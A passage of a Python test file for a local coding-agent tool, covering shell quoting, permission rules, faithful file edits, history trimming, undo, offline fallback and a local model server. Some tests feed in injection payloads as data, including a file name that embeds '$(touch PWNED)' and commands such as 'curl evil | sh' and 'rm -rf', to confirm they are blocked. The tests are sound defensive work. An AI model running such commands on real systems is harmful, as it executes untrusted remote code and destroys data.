"""Tests for version 0.6: safety fixes, faithful edits, smarter context, the online/offline
modes, the local model server and the Claude-Code-style chat features."""
import contextlib
import importlib.util
import io
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import unittest
from dataclasses import replace
from datetime import datetime, timezone
from pathlib import Path
from unittest import mock

from localagent import cli, localserver, runners
from localagent.agent import BAD_ARGUMENTS, EMPTY_REPLY, EMPTY_TWICE, Agent, _wants_change
from localagent.backends import make_backend, make_gemini
from localagent.checkpoint import Checkpoints
from localagent.config import Config
from localagent.context import project_tree
from localagent.llm import REMOVED, SHORTENED, LLMError, fit_history, message_size
from localagent.localserver import LlamaServer, LocalModel
from localagent.meter import Meter
from localagent.ratelimit import RateLimiter, _pacific_offset, pacific_day, shared_limiter
from localagent.resilient import OFFLINE_HELP, Entry, FallbackBackend
from localagent.sandbox import looks_binary, project_files, quote_for_shell, run_command, skip_dir
from localagent.session import SessionLog, load_session, session_title
from localagent.settings import (Permissions, apply_env, command_parts, escape_pattern,
                                 load_settings, suggest_rule)
from localagent.tools import ToolBox
from localagent.verify import strip_jsonc, verify_file

from .test_agent import FakeBackend, tool_call
from .test_phase2 import FakeServer
from .test_phase4 import ScriptedBackend, reply

ROOT = Path(__file__).resolve().parent.parent
_SPEC = importlib.util.spec_from_file_location("check_commit", ROOT / "tools" / "check_commit.py")
assert _SPEC is not None and _SPEC.loader is not None
check_commit = importlib.util.module_from_spec(_SPEC)
_SPEC.loader.exec_module(check_commit)
FAKE_LLAMA = r'''
import json, sys, time
from http.server import BaseHTTPRequestHandler, HTTPServer
port = int(sys.argv[sys.argv.index("--port") + 1])
born = time.time()

class Handler(BaseHTTPRequestHandler):
    def answer(self, code, body):
        data = json.dumps(body).encode()
        self.send_response(code)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        loaded = time.time() - born > 0.3                      # "loading" for a moment
        self.answer(200 if loaded else 503, {"status": "ok"} if loaded else {"error": "loading"})

    def do_POST(self):
        self.rfile.read(int(self.headers["Content-Length"]))
        self.answer(200, {"choices": [{"message": {"content": "local hello"}}],
                          "usage": {"prompt_tokens": 3, "completion_tokens": 2}})

    def log_message(self, *args):
        pass

HTTPServer(("127.0.0.1", port), Handler).serve_forever()
'''


def box(tmp: str, settings: dict | None = None, **kw) -> ToolBox:
    """A ToolBox on a temp folder that approves everything (no formatting, so bytes are exact)."""
    return ToolBox(replace(Config(), workspace=Path(tmp), auto_format=False, **kw),
                   lambda _a: True, settings)


def free_port() -> int:
    """A TCP port nothing listens on right now."""
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        return int(probe.getsockname()[1])


class SafetyTests(unittest.TestCase):
    def test_file_names_are_quoted_for_the_shell(self):
        self.assertEqual(quote_for_shell("src/app.py"), "src/app.py")
        self.assertEqual(quote_for_shell("-rf.py"), "./-rf.py")
        quoted = quote_for_shell("a$(evil).py")
        self.assertNotEqual(quoted, "a$(evil).py")
        self.assertTrue(quoted.startswith("'") and quoted.endswith("'"))

    def test_a_file_name_cannot_inject_a_command_into_a_hook(self):
        with tempfile.TemporaryDirectory() as tmp:
            payload = ("a$(New-Item -ItemType File -Path PWNED).txt" if os.name == "nt"
                       else "a$(touch PWNED).txt")
            tools = box(tmp, {"hooks": {"after_edit": "echo checking {file}"}})
            self.assertTrue(tools.call("write_file", {"path": payload, "content": "x"}).startswith("OK"))
            self.assertFalse((Path(tmp) / "PWNED").exists())

    def test_timeout_stops_the_whole_process_tree(self):
        code = ("import subprocess, sys, time; "
                "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)']); "
                "time.sleep(30)")
        started = time.time()
        exit_code, output = run_command([sys.executable, "-c", code], Path.cwd(), 2, 500)
        self.assertEqual(exit_code, 124)
        self.assertIn("timed out", output)
        self.assertLess(time.time() - started, 15)          # not the child's 30 seconds

    def test_programs_get_no_keyboard_input(self):
        started = time.time()
        exit_code, output = run_command([sys.executable, "-c", "input('name? ')"], Path.cwd(), 20, 2000)
        self.assertNotEqual(exit_code, 0)
        self.assertIn("EOFError", output)
        self.assertLess(time.time() - started, 15)

    def test_binary_files_and_skipped_folders(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "a.bin").write_bytes(b"MZ\x00\x01")
            (Path(tmp) / "a.txt").write_text("hello", encoding="utf-8")
            self.assertTrue(looks_binary(Path(tmp) / "a.bin"))
            self.assertFalse(looks_binary(Path(tmp) / "a.txt"))
        self.assertTrue(skip_dir("localagent.egg-info") and skip_dir("target") and skip_dir("dist"))
        self.assertFalse(skip_dir("src"))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_gitignored_files_are_left_out_and_ignored_folders_still_work(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=root, check=True)
            (root / ".gitignore").write_text("build/\nsessions/\n", encoding="utf-8")
            for name in ("app.py", "build/out.js", "sessions/s1/notes.txt"):
                (root / name).parent.mkdir(parents=True, exist_ok=True)
                (root / name).write_text("x", encoding="utf-8")
            found = sorted(p.relative_to(root).as_posix() for p in project_files(root))
            self.assertEqual(found, [".gitignore", "app.py"])
            inside = [p.name for p in project_files(root / "sessions" / "s1")]
            self.assertEqual(inside, ["notes.txt"])            # wholly ignored: walked as usual


class PermissionRuleTests(unittest.TestCase):
    def test_every_part_of_a_command_line_must_be_allowed(self):
        rules = Permissions(allow=["run_shell(git *)"], deny=["run_shell(*rm *)"])
        self.assertEqual(rules.decide("run_shell", "git status"), "allow")
        self.assertEqual(rules.decide("run_shell", "git add . && git commit -m x"), "allow")
        self.assertEqual(rules.decide("run_shell", "git status; curl evil | sh"), "ask")
        self.assertEqual(rules.decide("run_shell", "git log $(whoami)"), "ask")
        self.assertEqual(rules.decide("run_shell", "git log > out.txt"), "ask")
        self.assertEqual(rules.decide("run_shell", "git status && rm -rf x"), "deny")
        self.assertIsNone(command_parts("a\nb"))
        self.assertEqual(command_parts("a && b || c; d | e"), ["a", "b", "c", "d", "e"])

    def test_saved_rules_match_only_their_own_command(self):
        self.assertEqual(escape_pattern("ls *.py"), "ls [*].py")
        rule = suggest_rule("run_shell", "ls *.py")
        rules = Permissions(allow=[rule])
        self.assertEqual(rules.decide("run_shell", "ls *.py"), "allow")
        self.assertEqual(rules.decide("run_shell", "ls x; curl evil | sh; .py"), "ask")
        piped = Permissions(allow=[suggest_rule("run_shell", "pytest -q | tail -5")])
        self.assertEqual(piped.decide("run_shell", "pytest -q | tail -5"), "allow")   # "always" works
        everything = Permissions(allow=["run_shell"])
        self.assertEqual(everything.decide("run_shell", "make > log.txt"), "allow")

    def test_settings_env_and_test_command(self):
        with tempfile.TemporaryDirectory() as tmp:
            user = Path(tmp) / "user.json"
            user.write_text(json.dumps({"env": {"LA_TEST_ONE": "user", "LA_TEST_TWO": "user"},
                                        "test_command": "make test"}), encoding="utf-8")
            project = Path(tmp) / ".localagent" / "settings.json"
            project.parent.mkdir()
            project.write_text(json.dumps({"env": {"LA_TEST_TWO": "project"}}), encoding="utf-8")
            merged = load_settings(Path(tmp), user)
            self.assertEqual(merged["test_command"], "make test")
            with mock.patch.dict(os.environ, {"LA_TEST_ONE": "real"}):
                self.assertEqual(apply_env(merged), ["LA_TEST_TWO"])
                self.assertEqual((os.environ["LA_TEST_ONE"], os.environ["LA_TEST_TWO"]),
                                 ("real", "project"))                   # a real variable wins


class FaithfulEditTests(unittest.TestCase):
    def test_line_endings_and_byte_order_mark_are_kept(self):
        with tempfile.TemporaryDirectory() as tmp:
            tools = box(tmp)
            for name, raw in (("lf.txt", b"one\ntwo\n"), ("crlf.txt", b"one\r\ntwo\r\n"),
                              ("bom.txt", b"\xef\xbb\xbfone\r\ntwo\r\n")):
                (Path(tmp) / name).write_bytes(raw)
                self.assertTrue(tools.call("edit_file", {"path": name, "old": "two",
                                                         "new": "2"}).startswith("OK"))
                self.assertEqual((Path(tmp) / name).read_bytes(), raw.replace(b"two", b"2"))
            (Path(tmp) / "new.cmd").unlink(missing_ok=True)
            tools.call("write_file", {"path": "new.cmd", "content": "@echo off\necho hi\n"})
            self.assertEqual((Path(tmp) / "new.cmd").read_bytes(), b"@echo off\r\necho hi\r\n")

    def test_rejected_write_restores_the_exact_bytes(self):
        with tempfile.TemporaryDirectory() as tmp:
            original = b"x = 1\ny = 2\n"
            (Path(tmp) / "m.py").write_bytes(original)
            result = box(tmp).call("edit_file", {"path": "m.py", "old": "y = 2", "new": "y = ("})
            self.assertTrue(result.startswith("REJECTED"))
            self.assertEqual((Path(tmp) / "m.py").read_bytes(), original)

    def test_python_with_a_byte_order_mark_or_an_old_encoding_is_valid_code(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bom.py").write_bytes(b"\xef\xbb\xbfprint('hi')\n")      # as PowerShell writes it
            (root / "latin.py").write_bytes(b"# -*- coding: latin-1 -*-\nname = '\xe9'\n")
            tools = box(tmp)
            self.assertEqual(tools.check_workspace(), [])                  # Python runs both
            self.assertTrue(tools.call("run_python", {"path": "bom.py"}).startswith("exit code 0"))
            result = tools.call("edit_file", {"path": "bom.py", "old": "﻿print", "new": "print"})
            self.assertTrue(result.startswith("OK"), result)                # naming the mark removes it
            self.assertEqual((root / "bom.py").read_bytes(), b"print('hi')\n")

    def test_empty_old_text_is_refused(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "n.md").write_text("abc", encoding="utf-8")
            tools = box(tmp)
            self.assertIn("must not be empty", tools.call(
                "edit_file", {"path": "n.md", "old": "", "new": "X", "all": True}))
            self.assertIn("must not be empty", tools.call(
                "multi_edit", {"path": "n.md", "edits": [{"old": "", "new": "X"}]}))
            self.assertEqual((Path(tmp) / "n.md").read_text(encoding="utf-8"), "abc")

    def test_search_covers_every_text_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "src").mkdir()
            (root / "src" / "a.ts").write_text("const needle = 1;\n", encoding="utf-8")
            (root / "b.js").write_text("needle()\n", encoding="utf-8")
            (root / "c.py").write_text("needle = 3\n", encoding="utf-8")
            (root / "blob.bin").write_bytes(b"needle\x00")
            tools = box(tmp)
            everything = tools.call("search", {"pattern": "needle"})
            self.assertTrue(all(n in everything for n in ("src/a.ts:1", "b.js:1", "c.py:1")))
            self.assertNotIn("blob.bin", everything)
            both = tools.call("search", {"pattern": "needle", "glob": "*.{js,ts}"})
            self.assertTrue("a.ts" in both and "b.js" in both and "c.py" not in both)
            self.assertEqual(tools.call("search", {"pattern": "needle", "glob": "src/*"}),
                             "src/a.ts:1: const needle = 1;")
            self.assertIn("c.py:1", tools.call("search", {"pattern": "needle", "path": "c.py"}))

    def test_read_file_refuses_binary_and_says_how_much_is_left(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "model.bin").write_bytes(b"\x00\x01" * 100)
            (Path(tmp) / "t.txt").write_text("\n".join(f"line {i}" for i in range(1, 11)),
                                             encoding="utf-8")
            tools = box(tmp)
            self.assertIn("binary file", tools.call("read_file", {"path": "model.bin"}))
            part = tools.call("read_file", {"path": "t.txt", "start": 2, "end": 3})
            self.assertEqual(part, "2: line 2\n3: line 3\n(lines 2-3 of 10)")
            self.assertEqual(tools.call("read_file", {"path": "t.txt", "start": 50}),
                             "(the file has only 10 lines)")
            with mock.patch("localagent.tools.MAX_READ_BYTES", 10):
                self.assertIn("too big", tools.call("read_file", {"path": "t.txt"}))
                self.assertEqual(tools.call("read_file", {"path": "t.txt", "start": 9, "end": 9}),
                                 "9: line 9")


class LanguageCheckTests(unittest.TestCase):
    def check(self, name: str, text: str) -> bool:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / name
            path.write_text(text, encoding="utf-8")
            return verify_file(path, Path(tmp)).ok

    def test_json_with_comments_where_the_format_allows_them(self):
        jsonc = '{\n  // options\n  "a": {"b": [1, 2,], /* note */ "c": "x // y, }",},\n}\n'
        self.assertTrue(self.check("tsconfig.json", jsonc))
        self.assertTrue(self.check("settings.jsonc", jsonc))
        self.assertFalse(self.check("package.json", jsonc))         # npm would reject it too
        self.assertTrue(self.check("data.json", '﻿{"a": 1}'))  # a byte-order mark is fine
        self.assertEqual(json.loads(strip_jsonc('{"u": "http://x//y", "c": "a, }",}')),
                         {"u": "http://x//y", "c": "a, }"})

    @unittest.skipUnless(shutil.which("gcc") and shutil.which("g++"), "gcc/g++ not installed")
    def test_header_files_may_be_c_or_cpp(self):
        self.assertTrue(self.check("shape.h", "namespace g { class S { public: int x; }; }\n"))
        self.assertTrue(self.check("point.h", "struct point { int x, y; };\n"))
        self.assertFalse(self.check("broken.h", "class X { int y }\n"))

    @unittest.skipUnless(shutil.which("rustfmt"), "rustfmt not installed")
    def test_rust_files_may_name_modules_not_written_yet(self):
        self.assertTrue(self.check("main.rs", "mod util;\nfn main() { util::hi(); }\n"))
        self.assertFalse(self.check("bad.rs", "mod util;\nfn main() { let x = ; }\n"))


class TestRunnerTests(unittest.TestCase):
    def test_the_right_test_tool_is_chosen(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.assertEqual(runners.test_kind(root), "python")
            (root / "package.json").write_text('{"scripts": {"test": "jest"}}', encoding="utf-8")
            self.assertEqual(runners.test_kind(root), "npm")
            (root / "package.json").write_text(
                '{"scripts": {"test": "echo \\"Error: no test specified\\" && exit 1"}}',
                encoding="utf-8")
            self.assertEqual(runners.test_kind(root), "python")     # npm's placeholder
            (root / "go.mod").write_text("module x\n", encoding="utf-8")
            self.assertEqual(runners.test_kind(root), "go")
            (root / "tests").mkdir()
            (root / "tests" / "test_a.py").write_text("", encoding="utf-8")
            self.assertEqual(runners.test_kind(root), "python")     # Python tests win
            self.assertEqual(runners._unittest_start(root), "-s tests")

    def test_tests_in_a_plain_tests_folder_are_found(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "tests").mkdir()
            (Path(tmp) / "tests" / "test_a.py").write_text(
                "import unittest\nclass T(unittest.TestCase):\n    def test_x(self):\n"
                "        self.assertTrue(True)\n", encoding="utf-8")
            result = box(tmp).call("run_tests", {})
            self.assertTrue(result.startswith("exit code 0"), result)
            self.assertTrue("Ran 1 test" in result or "1 passed" in result, result)

    def test_your_own_test_command_from_the_settings(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = box(tmp, {"test_command": "echo custom-tests-ran"}).call("run_tests", {})
            self.assertIn("custom-tests-ran", result)

    def test_the_project_virtual_environment_is_used(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertEqual(runners.project_python(Path(tmp)), sys.executable)
            inside = "Scripts/python.exe" if os.name == "nt" else "bin/python"
            fake = Path(tmp) / ".venv" / inside
            fake.parent.mkdir(parents=True)
            fake.write_text("", encoding="utf-8")
            self.assertEqual(runners.project_python(Path(tmp)), str(fake))


class HistoryTests(unittest.TestCase):
    def history(self) -> list[dict]:
        big_call = {"id": "c1", "function": {"name": "write_file",
                                             "arguments": {"path": "a.py", "content": "x" * 5000}},
                    "extra_content": {"google": {"thought_signature": "S"}}}
        return [{"role": "system", "content": "sys"},
                {"role": "user", "content": "first request"},
                {"role": "assistant", "content": "", "tool_calls": [big_call]},
                {"role": "tool", "tool_call_id": "c1", "content": "y" * 3000},
                {"role": "assistant", "content": "done"},
                {"role": "user", "content": "second"},
                {"role": "assistant", "content": "ok"},
                {"role": "user", "content": "third"},
                {"role": "assistant", "content": "fine"}]

    def test_tool_call_arguments_count_and_are_shortened_last(self):
        history = self.history()
        self.assertGreater(message_size(history[2]), 5000)
        fitted = fit_history(history, 6000)
        self.assertEqual(fitted[3]["content"], REMOVED)                  # 1. output blanked
        self.assertEqual(fitted[2]["tool_calls"][0]["function"]["arguments"]["content"], "x" * 5000)
        shorter = fit_history(history, 1000)                             # 2. arguments shortened
        call = shorter[2]["tool_calls"][0]
        self.assertEqual(call["function"]["arguments"], {"path": "a.py", "content": SHORTENED})
        self.assertNotIn("extra_content", call)
        self.assertEqual(history[3]["content"], "y" * 3000)             # the original is untouched

    def test_oldest_exchanges_are_dropped_only_as_a_last_resort(self):
        history = self.history()
        history[1] = {"role": "user", "content": "z" * 9000}
        fitted = fit_history(history, 2000)
        self.assertEqual(fitted[0]["content"], "sys")
        self.assertEqual(fitted[1], {"role": "user", "content": "second"})   # starts with a request
        self.assertEqual(fitted[-4:], history[-4:])

    def make(self, tmp, script, **kw):
        cfg = replace(Config(), workspace=Path(tmp), auto_format=False, **kw)
        return Agent(cfg, FakeBackend(script), ToolBox(cfg, lambda _q: True), Meter())

    def test_the_agent_measures_arguments_too(self):
        with tempfile.TemporaryDirectory() as tmp:
            agent = self.make(tmp, [])
            before = agent._size()
            agent.messages.append(self.history()[2])
            self.assertGreater(agent._size() - before, 5000)

    def test_an_empty_answer_is_retried_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            empty = {"role": "assistant", "content": ""}
            agent = self.make(tmp, [empty, {"role": "assistant", "content": "4"}])
            self.assertEqual(agent.run("what is 2+2?"), "4")
            self.assertIn(EMPTY_REPLY, [m["content"] for m in agent.messages])
            self.assertNotIn("", [m["content"] for m in agent.messages if m["role"] == "assistant"
                                  and not m.get("tool_calls")])
            twice = self.make(tmp, [empty, empty])
            self.assertEqual(twice.run("hello?"), EMPTY_TWICE)

    def test_cut_off_arguments_are_explained_and_a_cut_off_answer_is_kept(self):
        with tempfile.TemporaryDirectory() as tmp:
            broken = {"role": "assistant", "content": "", "tool_calls": [
                {"function": {"name": "write_file", "arguments": '{"path": "a.py", "content": "pri'}}]}
            cut = {"role": "assistant", "content": "", "tool_calls": [
                {"function": {"name": "finish", "arguments": '{"summary": "The answer is 42 bec'}}]}
            agent = self.make(tmp, [broken, cut])
            answer = agent.run("explain")
            self.assertIn(BAD_ARGUMENTS, [m["content"] for m in agent.messages if m["role"] == "tool"])
            self.assertEqual(answer, "The answer is 42 bec [answer cut off]")

    def test_polite_requests_still_count_as_changes(self):
        for text in ("Please fix the bug", "can you add a test?", "Go ahead and create it",
                     "I want you to rename x"):
            self.assertTrue(_wants_change(text), text)
        for text in ("Can you explain this?", "why is it slow", "please"):
            self.assertFalse(_wants_change(text), text)

    def test_switching_models_keeps_the_conversation(self):
        with tempfile.TemporaryDirectory() as tmp:
            agent = self.make(tmp, [{"role": "assistant", "content": "online answer"}])
            agent.run("first")
            local = FakeBackend([{"role": "assistant", "content": "offline answer"}])
            agent.set_backend(local, replace(Config(), backend="local", num_ctx=8192))
            self.assertIs(agent.backend, local)
            self.assertEqual(agent.run("second"), "offline answer")
            self.assertIn("first", [m["content"] for m in agent.messages])


class SessionAndUndoTests(unittest.TestCase):
    def test_resume_skips_what_reset_or_compact_left_behind(self):
        with tempfile.TemporaryDirectory() as tmp:
            log = SessionLog(Path(tmp))
            log.append({"role": "user", "content": "secret topic"})
            log.mark("reset")
            log.append({"role": "user", "content": "new topic"})
            with log.path.open("a", encoding="utf-8") as handle:
                handle.write('{"role": "user", "cont')               # a crash mid-write
            self.assertEqual(load_session(log.path), [{"role": "user", "content": "new topic"}])
            self.assertIn("secret topic", session_title(log.path))  # titled by its first request

    def test_agent_marks_reset_and_compaction_in_the_log(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = replace(Config(), workspace=Path(tmp))
            log = SessionLog(Path(tmp) / "s")
            agent = Agent(cfg, FakeBackend([{"role": "assistant", "content": "a"}] * 3
                                           + [{"role": "assistant", "content": "SUMMARY"}]),
                          ToolBox(cfg), Meter(), log)
            agent.run("one")
            agent.reset()
            agent.run("two")
            agent.run("three")
            agent.compact()
            restored = load_session(log.path)
            self.assertIn("SUMMARY", restored[0]["content"])
            self.assertFalse(any("one" == m.get("content") for m in restored))

    def test_undo_skips_quiet_requests_and_keeps_your_own_edits(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "a.txt").write_text("v1", encoding="utf-8")
            (root / "b.txt").write_text("b1", encoding="utf-8")
            points = Checkpoints(root)
            points.take("change a and b")
            (root / "a.txt").write_text("v2", encoding="utf-8")
            (root / "b.txt").write_text("b2", encoding="utf-8")
            (root / "c.txt").write_text("new", encoding="utf-8")
            points.commit()
            points.take("just a question")
            points.commit()                                         # changed nothing: no step
            time.sleep(0.05)
            (root / "b.txt").write_text("my own edit", encoding="utf-8")
            message = points.undo()
            self.assertEqual((root / "a.txt").read_text(encoding="utf-8"), "v1")
            self.assertEqual((root / "b.txt").read_text(encoding="utf-8"), "my own edit")
            self.assertFalse((root / "c.txt").exists())
            self.assertIn('restored 1 file(s), removed 1 new file(s) (from "change a and b")', message)
            self.assertIn("left 1 file(s) alone", message)
            self.assertEqual(points.undo(), "nothing to undo")

    def test_a_same_size_edit_in_the_same_clock_tick_is_still_seen(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "keep.txt"
            path.write_text("v1", encoding="utf-8")
            stamp = path.stat().st_mtime_ns
            points = Checkpoints(Path(tmp))
            points.take()
            path.write_text("v2", encoding="utf-8")              # same size ...
            os.utime(path, ns=(stamp, stamp))                    # ... and the same coarse time stamp
            self.assertIn("restored 1", points.undo())          # seen anyway (it was "racy")
            self.assertEqual(path.read_text(encoding="utf-8"), "v1")

    def test_snapshots_store_each_content_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            for i in range(5):
                (Path(tmp) / f"f{i}.txt").write_text("same content", encoding="utf-8")
            points = Checkpoints(Path(tmp))
            for _ in range(3):
                points.take()
                points.commit()
            self.assertEqual(len(points._blobs), 1)


class OfflineTests(unittest.TestCase):
    def chain(self, hosted, local=None, probe=None, clock=None):
        notices: list[str] = []
        entries = [Entry("gemini-x", hosted, RateLimiter("gemini-x", 100, 10**6, 100))]
        if local is not None:
            entries.append(Entry("local", local))
        backend = FallbackBackend(entries, 3, sleep=lambda _s: None, on_notice=notices.append,
                                  probe=probe, clock=clock or time.monotonic)
        return backend, notices

    def test_no_internet_goes_straight_to_the_local_model_and_back(self):
        now = [1000.0]
        hosted = ScriptedBackend([LLMError("no name", dns=True), reply("online again")])
        local = ScriptedBackend([reply("local 1"), reply("local 2"), reply("local 3")])
        up = [False]
        backend, notices = self.chain(hosted, local, probe=lambda: up[0], clock=lambda: now[0])
        self.assertEqual(backend.chat([], []).message["content"], "local 1")
        self.assertEqual(hosted.calls, 1)                           # a name failure: no retries
        self.assertTrue(backend.offline and any("unreachable" in n for n in notices))
        self.assertEqual(backend.chat([], []).message["content"], "local 2")
        self.assertEqual(hosted.calls, 1)                           # skipped while offline
        now[0] += 120                                               # cool-down over, still down
        self.assertEqual(backend.chat([], []).message["content"], "local 3")
        self.assertEqual(hosted.calls, 1)
        now[0] += 120
        up[0] = True                                                # the internet is back
        self.assertEqual(backend.chat([], []).message["content"], "online again")
        self.assertFalse(backend.offline)
        self.assertTrue(any("back online" in n for n in notices))

    def test_a_repeated_network_error_also_means_offline(self):
        hosted = ScriptedBackend([LLMError("reset"), LLMError("reset")])
        backend, _ = self.chain(hosted, ScriptedBackend([reply("local")]))
        self.assertEqual(backend.chat([], []).message["content"], "local")
        self.assertEqual(hosted.calls, 2)                           # one retry, then offline

    def test_without_a_local_model_the_error_says_what_to_do(self):
        backend, _ = self.chain(ScriptedBackend([LLMError("no name", dns=True)]))
        with self.assertRaises(LLMError) as caught:
            backend.chat([], [])
        self.assertIn(OFFLINE_HELP, str(caught.exception))

    def test_a_final_error_is_not_retried(self):
        hosted = ScriptedBackend([LLMError("no name", dns=True)])
        local = ScriptedBackend([LLMError("no local model", final=True)])
        backend, _ = self.chain(hosted, local)
        with self.assertRaisesRegex(LLMError, "no local model"):
            backend.chat([], [])
        self.assertEqual(local.calls, 1)


class LimiterTests(unittest.TestCase):
    def test_pacific_time_without_time_zone_data(self):
        def utc(*parts):
            return datetime(*parts, tzinfo=timezone.utc)
        self.assertEqual(_pacific_offset(utc(2026, 3, 8, 9, 59)).total_seconds(), -8 * 3600)
        self.assertEqual(_pacific_offset(utc(2026, 3, 8, 10, 0)).total_seconds(), -7 * 3600)
        self.assertEqual(_pacific_offset(utc(2026, 11, 1, 8, 59)).total_seconds(), -7 * 3600)
        self.assertEqual(_pacific_offset(utc(2026, 11, 1, 9, 0)).total_seconds(), -8 * 3600)
        july = utc(2026, 7, 2, 6, 30).timestamp()                   # 23:30 on 1 July in California
        with mock.patch.dict(sys.modules, {"zoneinfo": None}):      # as on Windows
            self.assertEqual(pacific_day(july), "2026-07-01")

    def test_one_shared_limiter_per_model_and_long_waits_are_announced(self):
        with tempfile.TemporaryDirectory() as tmp:
            usage = Path(tmp) / "usage.json"
            first = shared_limiter("m", 5, 1000, 50, usage)
            self.assertIs(shared_limiter("m", 5, 1000, 50, usage), first)
            heard: list[str] = []
            clock = [0.0]
            limiter = RateLimiter("w", 1, 10_000, 100, usage, clock=lambda: clock[0],
                                  sleep=lambda s: clock.__setitem__(0, clock[0] + s),
                                  on_wait=heard.append)
            limiter.before_call(10)
            limiter.before_call(10)                                 # must wait about 60 s
            self.assertTrue(heard and "per-minute limit" in heard[0])
            self.assertEqual([p.name for p in Path(tmp).iterdir()], ["usage.json"])   # no leftovers


class ConfigTests(unittest.TestCase):
    def test_bad_values_are_explained(self):
        with mock.patch.dict(os.environ, {"LOCALAGENT_NUM_CTX": "8k"}):
            with self.assertRaisesRegex(ValueError, "LOCALAGENT_NUM_CTX must be a whole number"):
                Config.from_env()
        with mock.patch.dict(os.environ, {"LOCALAGENT_MODE": "sometimes"}):
            with self.assertRaisesRegex(ValueError, "LOCALAGENT_MODE"):
                Config.from_env()
        with mock.patch.dict(os.environ, {"LOCALAGENT_MODE": "OFFLINE", "LOCALAGENT_GPU_LAYERS": "9"}):
            config = Config.from_env()
        self.assertEqual((config.mode, config.gpu_layers), ("offline", 9))


class LocalServerTests(unittest.TestCase):
    def test_files_are_found_where_they_are_expected(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            (home / "models").mkdir()
            (home / "models" / "mmproj-x.gguf").write_text("", encoding="utf-8")
            (home / "models" / "small.gguf").write_text("", encoding="utf-8")
            with mock.patch.object(localserver, "HOME", home), \
                    mock.patch.object(localserver, "CHECKOUT", home / "none"):
                found = localserver.find_model_file(Config())
                self.assertEqual(found.name if found else "", "small.gguf")   # never mmproj
                self.assertIsNone(localserver.find_llama_server(replace(Config(), llama_server="")))
                given = home / "models" / "small.gguf"
                self.assertEqual(localserver.find_model_file(replace(Config(), model_file=str(given))),
                                 given)

    def test_command_line_and_where_a_server_may_be_started(self):
        server = LlamaServer(Path("llama-server"), Path("m.gguf"), "http://127.0.0.1:8123/v1", 4096)
        argv = server.argv()
        self.assertIn("--port", argv)
        self.assertEqual(argv[argv.index("--port") + 1], "8123")
        self.assertNotIn("-ngl", argv)                              # llama.cpp fits the GPU
        self.assertIn("-ngl", LlamaServer(Path("x"), Path("m.gguf"), "http://127.0.0.1:1/v1",
                                          4096, gpu_layers=9).argv())
        with mock.patch.object(localserver, "find_llama_server", return_value=Path("x")), \
                mock.patch.object(localserver, "find_model_file", return_value=Path("m.gguf")):
            self.assertTrue(localserver.can_start(Config()))
            self.assertFalse(localserver.can_start(replace(Config(), api_base="http://gpu-box:8000/v1")))

    def test_a_running_server_is_used_and_the_history_fitted(self):
        body = json.dumps({"choices": [{"message": {"content": "hi from local"}}]}).encode()
        server = FakeServer(200, body)
        self.addCleanup(server.close)
        config = replace(Config(), api_base=server.url, stream=False, local_ctx=2000)
        model = LocalModel(config)
        history = [{"role": "system", "content": "s"}] + [
            {"role": "user", "content": f"q{i} " + "w" * 3000} for i in range(4)]
        self.assertEqual(model.chat(history, []).message["content"], "hi from local")
        sent = server.received[-1]["messages"]
        self.assertLess(len(json.dumps(sent)), len(json.dumps(history)))   # shortened to fit
        self.assertTrue(model.last_model.startswith("local:"))

    def test_nothing_local_is_a_final_error(self):
        config = replace(Config(), api_base="http://127.0.0.1:9/v1", host="http://127.0.0.1:9")
        with mock.patch.object(localserver, "can_start", return_value=False):
            with self.assertRaises(LLMError) as caught:
                LocalModel(config).chat([], [])
        self.assertTrue(caught.exception.final)
        self.assertIn("No local model", str(caught.exception))

    def test_llama_server_is_started_waited_for_and_stopped(self):
        # a stopped process (or a virus scanner) may hold the log open for a moment on Windows
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp:
            script = Path(tmp) / "fake_llama.py"
            script.write_text(FAKE_LLAMA, encoding="utf-8")
            port = free_port()
            base = f"http://127.0.0.1:{port}/v1"
            server = LlamaServer(Path(sys.executable), Path(tmp) / "tiny.gguf", base, 2048)
            server.argv = lambda: [sys.executable, str(script), "--port", str(port)]  # type: ignore
            notices: list[str] = []
            config = replace(Config(), api_base=base, host="http://127.0.0.1:9", stream=False)
            with mock.patch.object(localserver, "LOG_FILE", Path(tmp) / "server.log"), \
                    mock.patch.object(localserver, "can_start", return_value=True), \
                    mock.patch.object(localserver, "server_for", return_value=server):
                model = LocalModel(config, on_notice=notices.append)
                try:
                    self.assertEqual(model.chat([{"role": "user", "content": "hi"}], [])
                                     .message["content"], "local hello")
                    self.assertTrue(server.running())
                    self.assertTrue(any("starting the local model" in n for n in notices))
                    self.assertTrue(any("ready" in n for n in notices))
                finally:
                    server.stop()
            self.assertFalse(server.running())


class ModeTests(unittest.TestCase):
    def choose(self, mode, key="", local="", fallback=""):
        found = {"openai": (True, False, False), "ollama": (False, True, False),
                 "local": (False, False, True), "": (False, False, False)}[local]
        with mock.patch.object(cli, "server_up", return_value=found[0]), \
                mock.patch.object(cli, "ollama_up", return_value=found[1]), \
                mock.patch.object(cli, "can_start", return_value=found[2]), \
                mock.patch.object(cli, "describe_local", return_value="a local model"):
